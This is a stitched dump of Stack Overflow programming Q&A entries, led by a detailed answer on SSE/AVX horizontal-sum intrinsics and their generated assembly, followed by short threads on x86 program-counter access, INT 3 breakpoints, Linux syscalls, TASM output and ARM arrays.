<p><strong>See the asm output from all this code <a href=""http://gcc.godbolt.org/#compilers:!((compiler:g6,options:&#39;-xc+-O3+-Wall+-fverbose-asm+-march%3Dhaswell+-mno-avx&#39;,sourcez:MQSwdgxgNgrgJgUwAQB4QFt3gC4CdwB0AFgHwBQoksiqAztnDseWQPStLZEi1I9JQQAa2QBZAIa5x2AOS0ANEgBGMbJwDuCcSLicA9kgh70ABxBRk2A0oTZsCXIb2ICbDtHFgA5khhgAZnq42H7SCFAAnkiIECCIvFa%2BtMjoegBu4ia0rLREMP4muuD0Wrp6/kipaURQWWT%2BUHrSSES0MOgA%2BlkdtMkAjAAUHR3ofQBMABxIaQCUSADeSEvLK6tr62vs00gAvEgA2kgAIkgAwkgAPkgAQkgAgkgAumQrw6OTSLn5y3sjnV/%2BBoILq0AZpRTgpAdUSiDoAZQAEgBVABiKIAMgBRAZjRQAZkUAAZFH0ZjMANxLLaHc4nK63B7PV4jcZTNroXhLX6YDriOBwEFgxQAimbDjs3h7Q5HADU51OMrpNxlDzuMtuTOWAI2XKhPKqCBqgoBwvatFFqy2B2W5yWStl8sVTypHAsai4yCMpnMDiQ4jSejifsq6WUUVwCBgtHAPgBLy1Zp1uz1nT5At6Awlwry/gp8aWEZCuDArx5EDS2F6HX8eLGmbNeYAvmR6o1mq12iCesk8UMWR9Zgt81D%2B2yc8m/iN0oa4DATILZpT1lslLgmnAIOJ6Ehwgh0AgwJWkAS%2BvokLjCcO3qzPonuan%2BQvs/k8yttet71O0oaoMac6aOVFLZuC8IgWnEKAKgAWhIAQ9HUcDIOHCUNk/NNu3rDln1zclh0LGBiw2Sdy0rWhq1rTDzVw5sWy2Wh0AgixHCMGhowALwQRQVDUKMYEYqJaEaTRHD8CxeicRAoPY5B%2BHEJATDXJQLHQVsmjUDtOm6Ig0z7d4pkHeYr1HW8OQnHltMfLIhWmV8E1Mj8Uw6CyBSsrMJVsgtbAIkt1mIisqxrOt3OoltQH8RAKmGO4ADUAA1hlU9t2TGABWAA2Lt/QAD101K0psodmT06YhN1P48o6Td6CyCqslZMEPJHYrqhAUCzPQCqECyvBxAgbB/FZJ8kFJSlgNasDWSM5qb3a3lLNBNIhIhECiAtZYtjTTgiGQUrJpWfDCI0rtegQXs0lZNakw2sAijAQQwEsbbPh7aYHGjPQwEUdRuAgMD%2BD0ExsAwCCkECRwYti4ctgGMADHULd7Fu%2BhcBgPqQA%2BhQ/Ruv0oCgJByi2vc/QjQmkAAFluLAwAwdoZjIZtgAPRh/BbNx2HZrY4D0GAlIQMguZ5iwWnZLp02SOtr0mXQ0jgOZFiTBWtjSZNDluK5GSmm8/AisqeW1hB/HABAXNBS6FY2TmPpkNR1CCXAIi%2B5APsiJJkDTOEjkUB7v0cKxUe4bxSa8SQlHELxkCUEAj3UKOwM8JAUQABT9flNY%2BAFsFMT8DSNKz9f8RRiIRwoF1li0tg9En%2BFhkNqlqOA04mXR30/KrsG6QpMxzTOTEag6fL8ysBX8NKyaGHl0NoOAwTgbCyRC2iOY5vhD1rMgcGFzsEDMWtuwQCXRxAJAsrligQHCg2RwhhKitZI/uFH3XOj8ExeqEbgOm3kBR4GLLFBPpcOoth4iggDBwnhdCwzAFBeIeBUZA2/PcOKAhbC8CjJ8f0bswz2CQDHLg3M1APWNjGYMVQKDhGSI3e%2B38yZPx6DmIEn8d51j/lCGE8JkRoixAMPoRJ8SKDGPPchN1z5UJMo/NCj4v4UQfmTf%2BjVJYTGobWOhAIgSNCYSAPoaVMKj0LuwxEqIMTYl4UgYkx4BHzxWFsOE8MTCk1KtgW2O5lIHkrGI9kKjJECmkUFdoeiWggFrH3LyhFB7RkGtGCinjBGAOsRwOEcJMRjFrg3eJ/dHJdR6n1TRMioBEjNjYpJcidzfhLPgmAbUo5OG9GJM8VQkb2D5PjCoclBD2CkHjEwWTcC6FwLWeQWVMDyEvDRDeR1fHdh7D0ISPQGK4xYggXSd9j4zEMisLKs1nK5JYfI3CGytnoV8b/PZeFQklnCVoyYPQgksKbKzReKdMiI1BmudASAJBSFkLwCGLQ7AmAAFzsHoG/acuAGjwQIF6VgABHGACB6DozANkPotY%2BgAE4%2BhkzSqwIg8EoJWCku0KCHV0pQTxfgNiH1sD8VYKisYDKyZ9EJMAeljLmWJXUiLboDEvnLI%2BCfQqywjDIrUIokyABFPiug9hZX2cKjGYrjKNCOHxPGex2RSr5PKl0gTVUgz2AMJAUFFAmuPniJAMpj4AHZ/4pKtVlfKdMVgiu3OK7g%2Br1WORzr%2BVy7QtWz0ldKxqdF2ieuTEas1ZqsqngdRah1KVLU2v/oSJNWV7XH1oQ6p1w5XVKuKuycN3jBQqrVYoD1aqQ2ugMIa41pr63H1TQ6jNWUs3HxzS6xVTUbyNGTIWtVOqkBjQjXW0d0bY3mrTYmh11qkDOoVaK7tHxuCzTURYY0Yay0mU9USGNVaTIjqjQ2rKTbj4TvTWm%2BNmap1pvyjOuduau3ivZLNSeoJGjlpAOXDg6EsjRANlob5hgoCeC8HIT4DChYAyBlgDiuAzlFguWWfyZFAqYXuUAA%3D%3D)),filterAsm:(binary:!t,commentOnly:!t,directives:!t,intel:!t,labels:!t),version:3"" rel=""noreferrer"">on the Godbolt Compiler Explorer</a>.</strong>  See also my improvements to <a href=""http://www.agner.org/optimize/#vectorclass"" rel=""noreferrer"">Agner Fog's C++ Vector Class Library</a> <code>horizontal_add</code> functions.  (<a href=""http://www.agner.org/optimize/vectorclass/read.php?i=124"" rel=""noreferrer"">message board thread</a>, and code on <a href=""https://github.com/pcordes/vectorclass/commits/master"" rel=""noreferrer"">github</a>).  I used CPP macros to select optimal shuffles for code-size for SSE2, SSE4, and AVX, and for avoiding <code>movdqa</code> when AVX isn't available.</p>

<hr>

<p>There are tradeoffs to consider:</p>

<ul>
<li>code size: smaller is better for L1 I-cache reasons, and for code fetch from disk (smaller binaries).  Total binary size mostly matters for compiler decisions made repeatedly all over a program.  If you're bothering to hand-code something with intrinsics, it's worth spending a few code bytes if it gives any speedup <em>for the whole program</em> (be careful of microbenchmarks that make unrolling look good).</li>
<li>uop-cache size: Often more precious than L1 I$.  4 single-uop instructions can take less space than 2 <code>haddps</code>, so this is highly relevant here.</li>
<li>latency: Sometimes relevant</li>
<li>throughput: usually irrelevant, horizontal sums shouldn't be in the innermost loop.</li>
<li>total fused-domain uops: If surrounding code doesn't bottleneck on the same port that the hsum uses, this is a proxy for the impact of the hsum on the throughput of the whole thing.</li>
</ul>

<p><strong>When a horizontal add is infrequent</strong>:</p>

<p>CPUs <strong>with no uop-cache</strong> might favour 2x <code>haddps</code>: It's slowish when it does run, but that's not often.  Being only 2 instructions minimizes the impact on the surrounding code (I$ size).</p>

<p>CPUs <strong>with a uop-cache</strong> will probably favour something that takes fewer uops, even if it's more instructions / more x86 code-size.  Total uops cache-lines used is what we want to minimize, which isn't as simple as minimizing total uops (taken branches and 32B boundaries always start a new uop cache line).</p>

<p>Anyway, with that said, horizontal sums come up a <em>lot</em>, so here's my attempt at carefully crafting some versions that compile nicely.  Not benchmarked on any real hardware, or even carefully tested.  There might be bugs in the shuffle constants or something.</p>

<hr>

<p><strong>If you're making a fallback / baseline version of your code, remember that only old CPUs will run it</strong>; newer CPUs will run your AVX version, or SSE4.1 or whatever.</p>

<p><strong>Old CPUs like K8, and Core2(merom) and earlier only have 64bit shuffle units</strong>.  Core2 has 128bit execution units for most instructions, but not for shuffles.  (Pentium M and K8 handle all 128b vector instructions as two 64bit halves).</p>

<p>Shuffles like <code>movhlps</code> that move data in 64bit chunks (no shuffling within 64bit halves) are fast, too.</p>

<p><strong>On old CPUs with slow shuffles</strong>:</p>

<ul>
<li><code>movhlps</code> (Merom: 1uop) is significantly faster than <code>shufps</code> (Merom: 3uops).  On Pentium-M, cheaper than <code>movaps</code>.  Also, it runs in the FP domain on Core2, avoiding the bypass delays from other shuffles.</li>
<li><code>unpcklpd</code> is faster than <code>unpcklps</code>.</li>
<li><code>pshufd</code> is slow, <code>pshuflw</code>/<code>pshufhw</code> are fast (because they only shuffle a 64bit half)</li>
<li><code>pshufb mm0</code> (MMX) is fast, <code>pshufb xmm0</code> is slow.</li>
<li><code>haddps</code> is very slow (6uops on Merom and Pentium M)</li>
<li><strong><code>movshdup</code> (Merom: 1uop) is interesting</strong>: It's the only 1uop insn that shuffles within 64b elements.</li>
</ul>

<p><code>shufps</code> on Core2(including Penryn) brings data into the integer domain, causing a bypass delay to get it back to the FP execution units for <code>addps</code>, but <code>movhlps</code> is entirely in the FP domain.  <code>shufpd</code> also runs in the float domain.</p>

<p><code>movshdup</code> runs in the integer domain, but is only one uop.</p>

<p>AMD K10, Intel Core2(Penryn/Wolfdale), and all later CPUs, run all xmm shuffles as a single uop.  (But note the bypass delay with <code>shufps</code> on Penryn, avoided with <code>movhlps</code>)</p>

<hr>

<p><strong>Without AVX, avoiding wasted <code>movaps</code>/<code>movdqa</code> instructions requires careful choice of shuffles</strong>.  Only a few shuffles work as a copy-and-shuffle, rather than modifying the destination.  Shuffles that combine data from two inputs (like <code>unpck*</code> or <code>movhlps</code>) can be used with a tmp variable that's no longer needed instead of <code>_mm_movehl_ps(same,same)</code>.</p>

<p><strong>Some of these can be made faster (save a MOVAPS) but uglier / less ""clean"" by taking a dummy arg for use as a destination for an initial shuffle.</strong>  For example:</p>

<pre><code>// Use dummy = a recently-dead variable that vec depends on,
//  so it doesn't introduce a false dependency,
//  and the compiler probably still has it in a register
__m128d highhalf_pd(__m128d dummy, __m128d vec) {
#ifdef __AVX__
    // With 3-operand AVX instructions, don't create an extra dependency on something we don't need anymore.
    (void)dummy;
    return _mm_unpackhi_pd(vec, vec);
#else
    // Without AVX, we can save a MOVAPS with MOVHLPS into a dead register
    __m128 tmp = _mm_castpd_ps(dummy);
    __m128d high = _mm_castps_pd(_mm_movehl_ps(tmp, _mm_castpd_ps(vec)));
    return high;
#endif
}
</code></pre>

<hr>

<h2>SSE1 (aka SSE):</h2>

<pre><code>float hsum_ps_sse1(__m128 v) {                                  // v = [ D C | B A ]
    __m128 shuf   = _mm_shuffle_ps(v, v, _MM_SHUFFLE(2, 3, 0, 1));  // [ C D | A B ]
    __m128 sums   = _mm_add_ps(v, shuf);      // sums = [ D+C C+D | B+A A+B ]
    shuf          = _mm_movehl_ps(shuf, sums);      //  [   C   D | D+C C+D ]  // let the compiler avoid a mov by reusing shuf
    sums          = _mm_add_ss(sums, shuf);
    return    _mm_cvtss_f32(sums);
}
    # gcc 5.3 -O3:  looks optimal
    movaps  xmm1, xmm0     # I think one movaps is unavoidable, unless we have a 2nd register with known-safe floats in the upper 2 elements
    shufps  xmm1, xmm0, 177
    addps   xmm0, xmm1
    movhlps xmm1, xmm0     # note the reuse of shuf, avoiding a movaps
    addss   xmm0, xmm1

    # clang 3.7.1 -O3:  
    movaps  xmm1, xmm0
    shufps  xmm1, xmm1, 177
    addps   xmm1, xmm0
    movaps  xmm0, xmm1
    shufpd  xmm0, xmm0, 1
    addss   xmm0, xmm1
</code></pre>

<p>I reported a <a href=""https://llvm.org/bugs/show_bug.cgi?id=26491"" rel=""noreferrer"">clang bug about pessimizing the shuffles</a>.  It has its own internal representation for shuffling, and turns that back into shuffles.  gcc more often uses the instructions that directly match the intrinsic you used.</p>

<p>Often clang does better than gcc, in code where the instruction choice isn't hand-tuned, or constant-propagation can simplify things even when the intrinsics are optimal for the non-constant case.  Overall it's a good thing that compilers work like a proper compiler for intrinsics, not just an assembler.  Compilers can often generate good asm from scalar C that doesn't even try to work the way good asm would.  Eventually compilers will treat intrinsics as just another C operator as input for the optimizer.</p>

<hr>

<h2>SSE3</h2>

<pre><code>float hsum_ps_sse3(__m128 v) {
    __m128 shuf = _mm_movehdup_ps(v);        // broadcast elements 3,1 to 2,0
    __m128 sums = _mm_add_ps(v, shuf);
    shuf        = _mm_movehl_ps(shuf, sums); // high half -&gt; low half
    sums        = _mm_add_ss(sums, shuf);
    return        _mm_cvtss_f32(sums);
}

    # gcc 5.3 -O3: perfectly optimal code
    movshdup    xmm1, xmm0
    addps       xmm0, xmm1
    movhlps     xmm1, xmm0
    addss       xmm0, xmm1
</code></pre>

<p>This has several advantages:</p>

<ul>
<li><p>doesn't require any <code>movaps</code> copies to work around destructive shuffles (without AVX): <code>movshdup xmm1, xmm2</code>'s destination is write-only, so it creates <code>tmp</code> out of a dead register for us.  This is also why I used <code>movehl_ps(tmp, sums)</code> instead of <code>movehl_ps(sums, sums)</code>.</p></li>
<li><p>small code-size.  The shuffling instructions are small:  <code>movhlps</code> is 3 bytes, <code>movshdup</code> is 4 bytes (same as <code>shufps</code>).  No immediate byte is required, so with AVX, <code>vshufps</code> is 5 bytes but <code>vmovhlps</code> and <code>vmovshdup</code> are both 4.</p></li>
</ul>

<p>I could save another byte with <code>addps</code> instead of <code>addss</code>.  Since this won't be used inside inner loops, the extra energy to switch the extra transistors is probably negligible.  FP exceptions from the upper 3 elements aren't a risk, because all elements hold valid FP data.  However, clang/LLVM actually ""understands"" vector shuffles, and emits better code if it knows that only the low element matters.</p>

<p>Like the SSE1 version, adding the odd elements to themselves may cause FP exceptions (like overflow) that wouldn't happen otherwise, but this shouldn't be a problem.  Denormals are slow, but IIRC producing a +Inf result isn't on most uarches.</p>

<hr>

<h2>SSE3 optimizing for code-size</h2>

<p>If code-size is your major concern, two <code>haddps</code> (<code>_mm_hadd_ps</code>) instructions will do the trick (Paul R's answer).  This is also the easiest to type and remember.  It is <strong>not fast</strong>, though.  Even Intel Skylake still decodes each <code>haddps</code> to 3 uops, with 6 cycle latency.  So even though it saves machine-code bytes (L1 I-cache), it takes up more space in the more-valuable uop-cache.  Real use-cases for <code>haddps</code>: <a href=""https://stackoverflow.com/questions/36195356/most-efficient-way-to-get-a-m256-of-horizontal-sums-of-8-source-m256-vectors"">a transpose-and-sum problem</a>, or doing some scaling at an intermediate step <a href=""https://stackoverflow.com/a/35132718/224132"">in this SSE <code>atoi()</code> implementation</a>.</p>

<hr>

<h2>AVX:</h2>

<p>This version saves a code byte vs. <a href=""https://stackoverflow.com/questions/13219146/how-to-sum-m256-horizontally/13222410#13222410"">Marat's answer to the AVX question</a>.</p>

<pre><code>#ifdef __AVX__
float hsum256_ps_avx(__m256 v) {
    __m128 vlow  = _mm256_castps256_ps128(v);
    __m128 vhigh = _mm256_extractf128_ps(v, 1); // high 128
           vlow  = _mm_add_ps(vlow, vhigh);     // add the low 128
    return hsum_ps_sse3(vlow);         // and inline the sse3 version, which is optimal for AVX
    // (no wasted instructions, and all of them are the 4B minimum)
}
#endif

 vmovaps xmm1,xmm0               # huh, what the heck gcc?  Just extract to xmm1
 vextractf128 xmm0,ymm0,0x1
 vaddps xmm0,xmm1,xmm0
 vmovshdup xmm1,xmm0
 vaddps xmm0,xmm1,xmm0
 vmovhlps xmm1,xmm1,xmm0
 vaddss xmm0,xmm0,xmm1
 vzeroupper 
 ret
</code></pre>

<hr>

<h2>Double-precision:</h2>

<pre><code>double hsum_pd_sse2(__m128d vd) {                      // v = [ B | A ]
    __m128 undef  = _mm_undefined_ps();                       // don't worry, we only use addSD, never touching the garbage bits with an FP add
    __m128 shuftmp= _mm_movehl_ps(undef, _mm_castpd_ps(vd));  // there is no movhlpd
    __m128d shuf  = _mm_castps_pd(shuftmp);
    return  _mm_cvtsd_f64(_mm_add_sd(vd, shuf));
}

# gcc 5.3.0 -O3
    pxor    xmm1, xmm1          # hopefully when inlined, gcc could pick a register it knew wouldn't cause a false dep problem, and avoid the zeroing
    movhlps xmm1, xmm0
    addsd   xmm0, xmm1


# clang 3.7.1 -O3 again doesn't use movhlps:
    xorpd   xmm2, xmm2          # with  #define _mm_undefined_ps _mm_setzero_ps
    movapd  xmm1, xmm0
    unpckhpd        xmm1, xmm2
    addsd   xmm1, xmm0
    movapd  xmm0, xmm1    # another clang bug: wrong choice of operand order


// This doesn't compile the way it's written
double hsum_pd_scalar_sse2(__m128d vd) {
    double tmp;
    _mm_storeh_pd(&amp;tmp, vd);       // store the high half
    double lo = _mm_cvtsd_f64(vd); // cast the low half
    return lo+tmp;
}

    # gcc 5.3 -O3
    haddpd  xmm0, xmm0   # Lower latency but less throughput than storing to memory

    # ICC13
    movhpd    QWORD PTR [-8+rsp], xmm0    # only needs the store port, not the shuffle unit
    addsd     xmm0, QWORD PTR [-8+rsp]
</code></pre>

<p>Storing to memory and back avoids an ALU uop.  That's good if shuffle port pressure, or ALU uops in general, are a bottleneck.  (Note that it doesn't need to <code>sub rsp, 8</code> or anything because the x86-64 SysV ABI provides a red-zone that signal handlers won't step on.)</p>

<p>Some people store to an array and sum all the elements, but compilers usually don't realize that the low element of the array is still there in a register from before the store.</p>

<hr>

<h2>Integer:</h2>

<p><code>pshufd</code> is a convenient copy-and-shuffle.  Bit and byte shifts are unfortunately in-place, and <code>punpckhqdq</code> puts the high half of the destination in the low half of the result, opposite of the way <code>movhlps</code> can extract the high half into a different register.</p>

<p>Using <code>movhlps</code> for the first step might be good on some CPUs, but only if we have a scratch reg.  <code>pshufd</code> is a safe choice, and fast on everything after Merom.</p>

<pre><code>int hsum_epi32_sse2(__m128i x) {
#ifdef __AVX__
    __m128i hi64  = _mm_unpackhi_epi64(x, x);           // 3-operand non-destructive AVX lets us save a byte without needing a mov
#else
    __m128i hi64  = _mm_shuffle_epi32(x, _MM_SHUFFLE(1, 0, 3, 2));
#endif
    __m128i sum64 = _mm_add_epi32(hi64, x);
    __m128i hi32  = _mm_shufflelo_epi16(sum64, _MM_SHUFFLE(1, 0, 3, 2));    // Swap the low two elements
    __m128i sum32 = _mm_add_epi32(sum64, hi32);
    return _mm_cvtsi128_si32(sum32);       // SSE2 movd
    //return _mm_extract_epi32(hl, 0);     // SSE4, even though it compiles to movd instead of a literal pextrd r32,xmm,0
}

    # gcc 5.3 -O3
    pshufd xmm1,xmm0,0x4e
    paddd  xmm0,xmm1
    pshuflw xmm1,xmm0,0x4e
    paddd  xmm0,xmm1
    movd   eax,xmm0

int hsum_epi32_ssse3_slow_smallcode(__m128i x){
    x = _mm_hadd_epi32(x, x);
    x = _mm_hadd_epi32(x, x);
    return _mm_cvtsi128_si32(x);
}
</code></pre>

<p>On some CPUs, it's safe to use FP shuffles on integer data.  I didn't do this, since on modern CPUs that will at most save 1 or 2 code bytes, with no speed gains (other than code size/alignment effects).</p>
","35270026"
"Reading program counter directly","15384","","<p>Can the program counter on Intel CPUs can be read directly (that is without 'tricks') in kernel mode or some other mode?</p>
","<p>No, EIP / IP cannot be accessed directly, but in position-dependent code it's a link-time constant so you can use a nearby (or distant) symbol as an immediate.</p>

<p>To get EIP or IP in position-independent code:</p>

<pre><code>call _here
_here: pop eax
; eax now holds the PC.
</code></pre>

<p>But this unbalances the call/return predictor stack, so prefer calling a function that does actually return, to avoid branch mispredicts on 15 or so future <code>ret</code> instructions in your parent functions.  (Unless you're not going to return, or so rarely that it doesn't matter.)</p>

<pre><code>get_retaddr:
    mov  eax, [esp]
    ret                ; keeps the return-address predictor stack balanced
</code></pre>

<hr>

<p>In x86-64 mode, RIP can be read directly using a RIP-relative <code>lea</code>.</p>

<pre><code>default rel           ; NASM directive: use RIP-relative by default

lea  rax, [_here]     ; RIP + 0
_here:
</code></pre>

<p>MASM: <code>lea  rax, [rip]</code></p>

<p>AT&amp;T syntax:  <code>lea 0(%rip), %rax</code></p>
","599982"
"How do debuggers guarantee correctness when using INT 3 (0xCC) software breakpoint even though an instruction was patched?","15375","","<p>I've read that the INT 3 (0xCC) is used for software breakpoints.</p>

<p>It is set by (for instance) a debugger by overwriting the actual program code in memory.</p>

<p>I've also read that INT 3 is a ""trap"" not ""fault"" exception meaning the address pushed on the stack is the address of the instruction following the INT3 instruction.</p>

<p>How does the debugger guarantee correctness if the patched instruction is not re-executed?</p>
","<p>When you want to continue execution after the breakpoint fires, you have two possibilities: either the breakpoint was only supposed to fire once, or it was supposed to be persistent. If it was only supposed to fire once, you restore the original value you overwrote with your breakpoint instruction, manually adjust the address to that instruction's address (remember, regardless of what instruction was there, what <em>executed</em> was your single-byte breakpoint, so the adjustment is always trivial). Then you continue execution.</p>

<p>If it was supposed to be a persistent breakpoint, there's one added wrinkle: before you continue execution, you set the single-step (aka trap) bit in the flags on the stack. That means only the one instruction where the breakpoint was set will execute, then you'll get a breakpoint interrupt again. You respond to that by restoring the int 3 byte you had just patched to the first byte of the original instruction, and (again) continue execution.</p>
","3748062"
"x86_64 Assembly Linux System Call Confusion","15374","","<p>I am currently learning Assembly language on Linux. I have been using the book 'Programming From the Ground Up' and all the examples are 32-bit. My OS is 64-bit and I have been trying to do all the examples in 64-bit. I am having trouble however:</p>

<pre><code>.section .data

.section .text
.global _start
_start:
movq $60, %rax
movq $2, %rbx
int $0x80
</code></pre>

<p>This merely just calls the Linux exit System call or it should. Instead it causes a SEG FAULT and when I instead do this</p>

<pre><code>.section .data

.section .text
.global _start
_start:
movq $1, %rax
movq $2, %rbx
int $0x80
</code></pre>

<p>it works. Clearly the problem is the value I move to %rax. The value $1 that I use in the second example is what 'Programming From the Ground Up' said to use however multiple sources on the Internet have said that the 64-bit System Call Number is $60.<a href=""http://www.acsu.buffalo.edu/~charngda/linux_syscalls_64bit.html"" rel=""noreferrer""> Reference</a>
What am I doing wrong? Also what other issues should I watch out for and what should I use for a reference? Just in case you need to know, I am on Chapter 5 in Programming From The Ground Up.</p>
","<p>You're running into one surprising difference between i386 and x86_64: they don't use the same system call mechanism. The correct code is:</p>

<pre><code>movq $60, %rax
movq $2,  %rdi   ; not %rbx!
syscall
</code></pre>

<p>Interrupt <code>0x80</code> always invokes 32-bit system calls. It's used to allow 32-bit applications to run on 64-bit systems.</p>

<p>For the purposes of learning, you should probably try to follow the tutorial exactly, rather than translating on the fly to 64-bit -- there are a few other significant behavioral differences that you're likely to run into. Once you're familiar with i386, <em>then</em> you can pick up x86_64 separately.</p>
","8510471"
"Converting numbers to ASCII in assembly","15324","","<p>Can someone explain why doing an OR operation on a binary number with 0x0030 as the operand produces the ASCII character of that number?</p>
","<p>Because looking at the ASCII chart, the digits 0 through nine start at 0x30. So you want the ASCII value for character 1? 0x30 or 0x01 = 0x31 = ASCII value for the number 1.</p>

<pre><code>In binary it's easy to see:

(0x30)   110000
or
(0x01)   000001
=        110001

Which is 0x31 - ASCII value of 1.
</code></pre>

<p><img src=""https://i.stack.imgur.com/wgJwb.gif"" alt=""enter image description here""></p>
","12903263"
"Colored Hello World in TASM","15290","","<p>Good day. I'm new in assembly language and I'm trying to print a colored ""Hello World"" in TASM. Here is my code so far. It just prints ""hello world"" without a color. <br></p>

<pre><code>.model small
.stack 100h

.data
message db 13,10,""Hello World!$""

.code
main proc near
   lea dx, message
   mov ah, 09h
   int 21h

   mov ah,4ch
   int 21h
main endp
</code></pre>

<p><br>
I've read something like this<br></p>

<pre><code>mov ah,9    ;Function 9: Write character and attribute at cursor position
mov al,'H'  ;AL = character to display
mov bh,0    ;BH = page number
mov bl,02EH ;BL = attribute (yellow on green)
mov cx,1    ;CX = number of times to write character
int 10H  ;Int 10H: Video (show the character)
</code></pre>

<p><br> in a forum but I can't incorporate it with my hello world. I'm confused why use that particular register and the like. Please help me. Thank you very much!<br><br></p>

<p><strong>EDIT</strong><br><br></p>

<pre><code>.model small
.stack 100h

.data
hello db 'Hello World!',0

.code
main proc near
    mov ax, @data
    mov ds, ax

    mov ax, 3
    int 10h

    mov si, 0             ; cl is the counter register, set it to
                      ; zero (the first character in the string)

start:                ; Beginning of loop
    mov al, hello[si]   ; Read the next byte from memory
    cmp al, 0           ; Compare the byte to null (the terminator)
    je endthis              ; If the byte is null, jump out of the loop

    mov ah, 09h
    mov al, hello[si]
    mov bh, 0
    mov bl,02EH
    mov cx,11
    int 10H  

    add si, 1           ; Move to the next byte in the string
    jmp start           ; Loop

endthis:    
    mov ah, 4ch
    int 21h

main endp
end main
</code></pre>
","<p>Assembly language, as any programming language, is a result of arbitrary design decisions. Sometimes there can be a reason why a specific register is used as a interrupt call input register (optimization), but many times not, and you just have to take the interface (here <code>int 10h</code> or <code>int 21h</code>) as granted.</p>

<p>Related to your problem with several exclamation marks <code>!!!!!!!!!!!</code> (I assume 11 exclamation marks), you have incorrect parameters in your <code>int 10</code> interrupt call:</p>

<pre><code>mov cx,11
</code></pre>

<p>According to <a href=""http://www.ctyme.com/rbrown.htm"" rel=""nofollow"">Ralf Brown's Interrupt List</a>, the parameters for <code>mov ah,9</code>, <code>int 10h</code> are the following:</p>

<pre><code>INT 10 - VIDEO - WRITE CHARACTER AND ATTRIBUTE AT CURSOR POSITION
    AH = 09h
    AL = character to display
    BH = page number (00h to number of pages - 1) (see #00010)
        background color in 256-color graphics modes (ET4000)
    BL = attribute (text mode) or color (graphics mode)
        if bit 7 set in &lt;256-color graphics mode, character is XOR'ed
          onto screen
    CX = number of times to write character
Return: nothing
Notes:  all characters are displayed, including CR, LF, and BS
    replication count in CX may produce an unpredictable result in graphics
      modes if it is greater than the number of positions remaining in the
      current row
    With PhysTechSoft's PTS ROM-DOS the BH, BL, and CX values are ignored
      on entry.
</code></pre>

<p>So, instead of <code>mov cx,11</code>, it should be <code>mov cx,1</code>.</p>

<p>And the second <code>mov al, hello[si]</code> is redundant, because <code>hello[si]</code> has already been loaded into <code>al</code> at that time with the previous identical instruction. This doesn't affect the functioning of the code, however.</p>

<p><strong>Edit:</strong> Added info on how to set and read the cursor location using <code>int 10h</code>.</p>

<p>It seems that you also need to update the cursor location with <code>mov ah,2</code>, <code>int 10h</code>, using the following parameters:</p>

<pre><code>INT 10 - VIDEO - SET CURSOR POSITION
    AH = 02h
    BH = page number
        0-3 in modes 2&amp;3
        0-7 in modes 0&amp;1
        0 in graphics modes
    DH = row (00h is top)
    DL = column (00h is left)
Return: nothing
</code></pre>

<p>Possibly you may need need to read the current cursor position with <code>mov ah,3</code>, <code>int 10h</code>, using the following parameters:</p>

<pre><code>INT 10 - VIDEO - GET CURSOR POSITION AND SIZE
    AH = 03h
    BH = page number
        0-3 in modes 2&amp;3
        0-7 in modes 0&amp;1
        0 in graphics modes
Return: AX = 0000h (Phoenix BIOS)
    CH = start scan line
    CL = end scan line
    DH = row (00h is top)
    DL = column (00h is left)
Notes:  a separate cursor is maintained for each of up to 8 display pages
    many ROM BIOSes incorrectly return the default size for a color display
      (start 06h, end 07h) when a monochrome display is attached
    With PhysTechSoft's PTS ROM-DOS the BH value is ignored on entry.
</code></pre>
","15324535"
"Free IDE + assembler + software emulator for x86 (MASM) assembly?","15250","","<p>I'm currently trying to get into x86 assembly ( I already have some pre-existing knowledge with x51 assembly) and I'm looking for a simple IDE+assembler+emulator for the assembly output.</p>

<p>Can you recommend any?</p>
","<p>I recommend the <a href=""http://flatassembler.net/index.php"" rel=""nofollow"" title=""Flat Assembler"">Flat Assembler</a>. Comes with a pretty nice and tiny IDE, runs on Windows, Linux, and MS-DOS.</p>

<p>There's also the <a href=""http://nasm.us"" rel=""nofollow"">Netwide Assembler</a>, which comes with a disassembler, but no IDE. Altough FASM's simple IDE is easily reproduced with any editor that allows for external commands.</p>
","7780898"
"GNU AS: movl (%eax), %eax","15183","","<p>What does <code>movl (%eax), %eax</code> mean?</p>

<p>I have googled enough but could not figure out what the bracket () means. Also, I see some syntax as <code>movl 8(%ebp), %eax</code></p>

<p>Could some someone suggest me some good reference? I have not been able to find any in the top 20 results from Google.</p>
","<p><code>%eax</code> is register EAX; <code>(%eax)</code> is the memory location whose address is contained in the register EAX; <code>8(%eax)</code> is the memory location whose address is the value of EAX plus 8.</p>
","6819980"
"How to properly create an array in ARM assembly?","15182","","<p>I'm currently learning ARM assembly for a class and have come across a problem where I'd need to use an ""array."" I'm aware that there is no such thing as an array in ARM so I have to allocate space and treat that as an array. I have two questions.</p>

<ol>
<li>Am I correctly adding new values to the array or am I merely overwriting the previous value? If I am overwriting the values, how do I go about adding new values?</li>
<li>How do I go about looping through the different values of the array? I know I have to use <code>loop:</code> but don't know how to use it to access different ""indexes.""</li>
</ol>

<p>So far, this is what I've gotten from reading ARM documentation as I've gathered from resources online.</p>

<pre><code>        .equ SWI_Exit,  0x11

        .text
        .global _start

_start: .global _start
        .global main

        b       main

main:
        ldr     R0, =MyArray
        mov     R1, #42
        str     R1, [R0], #4
        mov     R1, #43
        str     R1, [R0], #4
        swi     SWI_Exit

MyArray: .skip 20 * 4
        .end
</code></pre>

<p>As a side note, I am using <a href=""http://armsim.cs.uvic.ca/"" rel=""nofollow"">ARMSim#</a> as required by my professor, so some commands recognized by GNU tools won't be recognized by ARMSim#, or at least I believe that is the case. Please correct me if I'm wrong.</p>
","<ol>
<li>You are just overwriting elements.  At this level there are ""such things as arrays"", but only fixed-sized, preallocated arrays.  The <code>.skip</code> is allocating the fixed-size array.*  A variable-sized, growable array would typically be implemented with more complex dyanamic memory allocation code using the stack or a heap.</li>
<li>If you had a label like <code>loop:</code> (the actual name is arbitrary) you could branch (back) to it by using <code>b loop</code>.  (Probably, you would want to do the branch conditionally so that the program didn't loop forever.)  You can access different elements in the loop by changing <code>R0</code>, which you are already doing</li>
</ol>

<p>Also the <code>b main</code> isn't really serving any purpose since it is branching to he next instruction.  The code will do the same thing if you remove it.</p>

<p>[*] Alternately, you could say that your array is the just elements between <code>MyArray</code> and <code>R0</code> (not including the memory <code>R0</code> points to), in which, by changing <code>R0</code> you are extending the array.  But the maximum size Is still fixed by the <code>.skip</code> directive.</p>
","19332249"
"Is it possible to permanently damage the hardware by software?","15129","","<p>I have just read this question: <a href=""https://stackoverflow.com/questions/2740268/could-this-code-damage-my-processor"">Could this code damage my processor?</a> and this made me think.</p>

<p>Is it possible to damage hardware just by software? I heard that ""in the good old days"" (TM), when hard disk actuators were controlled by software, they could be hit against the central spindle, which would damage the drive permanently.</p>

